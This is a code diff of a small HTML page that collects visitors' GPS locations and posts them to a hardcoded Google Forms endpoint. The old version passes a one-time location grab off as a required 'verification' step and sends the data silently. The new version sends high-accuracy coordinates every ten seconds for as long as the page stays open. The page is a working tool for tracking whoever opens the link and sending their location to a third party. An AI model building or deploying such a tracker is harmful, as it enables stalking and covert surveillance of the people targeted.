@@ -1,74 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Location Verification</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<title>Live Location Tracking</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 
-<body style="font-family: Arial; text-align:center; padding-top:40px;">
-  <h3>Please allow location access</h3>
-  <p>This is required to continue.</p>
+<body style="font-family:Arial;text-align:center;padding-top:30px">
+<h3>Live location tracking started…</h3>
+<p>Keep this page open</p>
+
+<div id="status"></div>
 
 <script>
-(function () {
+const FORM_ACTION_URL =
+  "https://docs.google.com/forms/d/e/1FAIpQLSfe-VBAXa8RRk6o1eWfB2IdQW0h3NLGhruyUGKX3BnzU0N5tg/formResponse";
 
-  if (!navigator.geolocation) {
-    document.body.innerHTML = "Geolocation not supported ❌";
-    return;
-  }
+// 🔴 REPLACE WITH REAL ENTRY IDS
+const ENTRY_LAT  = "entry.XXXXXXXX";
+const ENTRY_LNG  = "entry.YYYYYYYY";
+const ENTRY_ACC  = "entry.ZZZZZZZZ";
+const ENTRY_TIME = "entry.AAAAAAAA";
 
-  navigator.geolocation.getCurrentPosition(
-    function (position) {
+let lastSentTime = 0;
 
-      // 📍 Location values
-      const latitude  = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const accuracy  = position.coords.accuracy;
-      const time      = new Date().toLocaleString();
+if (!navigator.geolocation) {
+  document.getElementById("status").innerHTML =
+    "Geolocation not supported ❌";
+} else {
 
-      // 🔗 REPLACE THIS WITH YOUR FORM ACTION URL
-      const FORM_ACTION_URL =
-        "https://docs.google.com/forms/d/e/1FAIpQLSfe-VBAXa8RRk6o1eWfB2IdQW0h3NLGhruyUGKX3BnzU0N5tg/formResponse";
+  navigator.geolocation.watchPosition(
+    function(pos) {
 
-      // 🧩 REPLACE ENTRY IDS
-      const ENTRY_LAT  = "entry.XXXXXXXX"; // Latitude
-      const ENTRY_LNG  = "entry.YYYYYYYY"; // Longitude
-      const ENTRY_TIME = "entry.ZZZZZZZZ"; // Time
-      const ENTRY_ACC  = "entry.AAAAAAAA"; // Accuracy (optional)
+      const now = Date.now();
 
-      // 📤 Prepare data
-      const formData = new FormData();
-      formData.append(ENTRY_LAT, latitude);
-      formData.append(ENTRY_LNG, longitude);
-      formData.append(ENTRY_TIME, time);
-      formData.append(ENTRY_ACC, accuracy);
+      // ⏱ Send every 10 seconds (avoid spam)
+      if (now - lastSentTime < 10000) return;
+      lastSentTime = now;
 
-      // 🚀 Send silently
+      const lat  = pos.coords.latitude;
+      const lng  = pos.coords.longitude;
+      const acc  = pos.coords.accuracy;
+      const time = new Date().toLocaleString();
+
+      // 📤 Send to Google Form
+      const data = new FormData();
+      data.append(ENTRY_LAT, lat);
+      data.append(ENTRY_LNG, lng);
+      data.append(ENTRY_ACC, acc);
+      data.append(ENTRY_TIME, time);
+
       fetch(FORM_ACTION_URL, {
         method: "POST",
         mode: "no-cors",
-        body: formData
+        body: data
       });
 
-      // ✅ Success UI
-      document.body.innerHTML = `
-        <h3>Location saved successfully ✅</h3>
-        <p>Thank you</p>
-      `;
+      // 🖥 UI update
+      document.getElementById("status").innerHTML =
+        "<b>LIVE LOCATION SAVED ✅</b><br>" +
+        "Lat: " + lat + "<br>" +
+        "Lng: " + lng + "<br>" +
+        "Accuracy: " + acc + " m<br>" +
+        "Time: " + time;
 
     },
-    function (error) {
-      document.body.innerHTML = "Location permission denied ❌";
+    function(err) {
+      document.getElementById("status").innerHTML =
+        "Location error ❌<br>" + err.message;
     },
     {
-      enableHighAccuracy: true,
-      timeout: 10000,
-      maximumAge: 0
+      enableHighAccuracy: true, // FORCE GPS
+      maximumAge: 0,            // NO CACHED LOCATION
+      timeout: 20000
     }
   );
-
-})();
+}
 </script>
 
 </body>
